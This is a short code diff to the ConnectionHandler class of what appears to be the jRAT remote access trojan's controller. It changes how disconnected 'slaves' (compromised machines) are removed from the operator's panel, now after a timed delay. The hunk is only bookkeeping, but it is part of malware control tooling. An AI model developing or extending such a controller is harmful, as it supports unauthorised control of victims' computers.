@@ -8,6 +8,8 @@ import io.jrat.controller.exceptions.CloseException;
 import io.jrat.controller.exceptions.DuplicateSlaveException;
 import io.jrat.controller.settings.StoreOfflineSlaves;
 import io.jrat.controller.utils.TrayIconUtils;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class ConnectionHandler {
 
@@ -30,7 +32,7 @@ public class ConnectionHandler {
 		}	
 	}
 
-	public synchronized static void removeSlave(AbstractSlave client, Exception e) {
+	public synchronized static void removeSlave(final AbstractSlave client, int delay) {
 		if (SampleMode.isInSampleMode()) {
 			return;
 		}
@@ -42,13 +44,18 @@ public class ConnectionHandler {
 		TrayIconUtils.setToolTip(title);
 		client.closeSocket(new CloseException("Removing connection..."));
 
-		for (AbstractSlave as : StoreOfflineSlaves.getGlobal().getList()) {
-			if (as.equals(client)) {
-				Main.instance.getPanelClients().addSlave(as);
-			}
-		}
+		new Timer().schedule(new TimerTask() {
+			@Override
+			public void run() {
+				for (AbstractSlave as : StoreOfflineSlaves.getGlobal().getList()) {
+					if (as.equals(client)) {
+						Main.instance.getPanelClients().addSlave(as);
+					}
+				}
 
-		Main.instance.getPanelClients().removeSlave(client);
+				Main.instance.getPanelClients().removeSlave(client);
+			}
+		}, delay);
 	}
 
 }
